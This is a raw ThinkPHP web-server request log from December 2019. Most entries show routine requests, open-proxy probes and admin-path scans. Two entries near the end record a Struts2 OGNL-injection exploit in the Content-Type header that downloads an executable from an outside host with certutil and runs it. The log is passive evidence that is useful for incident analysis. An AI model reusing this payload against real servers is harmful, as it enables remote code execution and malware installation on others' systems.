  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000211s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T08:32:59+08:00 ] 221.13.12.17 GET www.123cha.comhttp://www.123cha.com/
[运行时间：0.017796s] [吞吐率：56.19req/s] [内存消耗：474.04kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000816s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000849s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.123cha.com',
  'proxy-authorization' => 'Basic Og==',
  'proxy-connection' => 'Keep-Alive',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000611s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000304s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000223s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T08:32:59+08:00 ] 110.80.154.160 CONNECT www.ipip.net:443www.ipip.net:443
[运行时间：0.014293s] [吞吐率：69.96req/s] [内存消耗：471.58kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000741s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000775s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ipip.net:443',
  'proxy-authorization' => 'Basic Og==',
  'user-agent' => 'PycURL/7.43.0 libcurl/7.47.0 GnuTLS/3.4.10 zlib/1.2.8 libidn/1.32 librtmp/2.3',
  'proxy-connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000574s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000279s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000220s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T08:33:00+08:00 ] 124.235.138.160 CONNECT www.baidu.com:443www.baidu.com:443
[运行时间：0.018543s] [吞吐率：53.93req/s] [内存消耗：471.58kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001063s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001100s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com:443',
  'proxy-authorization' => 'Basic Og==',
  'user-agent' => 'PycURL/7.43.0 libcurl/7.47.0 GnuTLS/3.4.10 zlib/1.2.8 libidn/1.32 librtmp/2.3',
  'proxy-connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000845s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000321s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000224s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T08:35:12+08:00 ] 177.190.176.92 GET 114.115.146.220:80/
[运行时间：0.024756s] [吞吐率：40.39req/s] [内存消耗：472.14kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001061s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001105s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000880s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000335s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000223s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T08:42:03+08:00 ] 77.40.37.84 GET 114.115.146.220:80/
[运行时间：0.025055s] [吞吐率：39.91req/s] [内存消耗：472.14kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001075s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001109s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000883s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000342s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000220s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T08:45:42+08:00 ] 70.69.170.237 GET 114.115.146.22/
[运行时间：0.025119s] [吞吐率：39.81req/s] [内存消耗：471.29kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001064s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001098s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.22',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000870s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000329s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000219s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T09:04:41+08:00 ] 5.83.161.240 GET 114.115.146.220/CFIDE/administrator/
[运行时间：0.019702s] [吞吐率：50.76req/s] [内存消耗：332.56kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000067s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001075s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001109s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'CFIDE',
    1 => 'administrator',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000214s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T09:06:34+08:00 ] 177.99.81.76 GET 114.115.146.220:80/
[运行时间：0.019200s] [吞吐率：52.08req/s] [内存消耗：472.14kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000854s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000888s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000900s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000368s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T09:18:46+08:00 ] 86.109.43.78 GET 114.115.146.220:80/
[运行时间：0.025754s] [吞吐率：38.83req/s] [内存消耗：472.14kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001073s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001107s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000860s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000338s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000219s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T09:26:38+08:00 ] 201.1.48.118 GET 114.115.146.220:80/
[运行时间：0.025250s] [吞吐率：39.60req/s] [内存消耗：472.14kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001070s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001103s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000898s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000331s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000233s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T10:23:38+08:00 ] 82.56.138.56 GET 114.115.146.220:80/
[运行时间：0.028698s] [吞吐率：34.85req/s] [内存消耗：472.14kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000070s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001176s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001210s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001022s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000359s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000270s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T11:10:04+08:00 ] 80.82.70.187 GET www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif
[运行时间：0.019958s] [吞吐率：50.11req/s] [内存消耗：332.79kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001056s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001090s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cache',
    1 => 'global',
    2 => 'img',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com',
  'user-agent' => 'Mozilla',
  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000298s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T12:51:29+08:00 ] 195.162.70.105 GET 114.115.146.220:80/
[运行时间：0.029942s] [吞吐率：33.40req/s] [内存消耗：472.14kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000076s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001709s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001761s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001421s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000335s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T13:20:34+08:00 ] 164.215.220.137 GET 114.115.146.220:80/
[运行时间：0.024507s] [吞吐率：40.80req/s] [内存消耗：472.14kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000066s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001054s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001088s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000863s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000339s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T13:24:53+08:00 ] 176.104.103.60 GET 114.115.146.220:80/
[运行时间：0.027334s] [吞吐率：36.58req/s] [内存消耗：472.14kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001113s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001147s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000875s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000365s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000223s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T13:42:16+08:00 ] 114.115.184.18 GET 114.115.146.220/struts2-rest-showcase/orders.xhtml
[运行时间：0.019640s] [吞吐率：50.92req/s] [内存消耗：338.07kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001075s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001109s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-rest-showcase',
    1 => 'orders.xhtml',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'content-type' => '%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe %SystemRoot%/Temp/fahwwpsbyfvkjmv26247.exe & cmd.exe /c %SystemRoot%/Temp/fahwwpsbyfvkjmv26247.exe\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.115.146.220:80/struts2-rest-showcase/orders.xhtml',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000213s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T13:42:16+08:00 ] 114.115.184.18 GET 114.115.146.220/index.action
[运行时间：0.010007s] [吞吐率：99.93req/s] [内存消耗：337.89kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000051s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000699s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000732s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index.action',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'content-type' => '%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe %SystemRoot%/Temp/fahwwpsbyfvkjmv26247.exe & cmd.exe /c %SystemRoot%/Temp/fahwwpsbyfvkjmv26247.exe\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.115.146.220:80/index.action',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000210s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T13:42:16+08:00 ] 114.115.184.18 GET 114.115.146.220/index.do
[运行时间：0.009947s] [吞吐率：100.53req/s] [内存消耗：337.89kb] [文件加载：117]
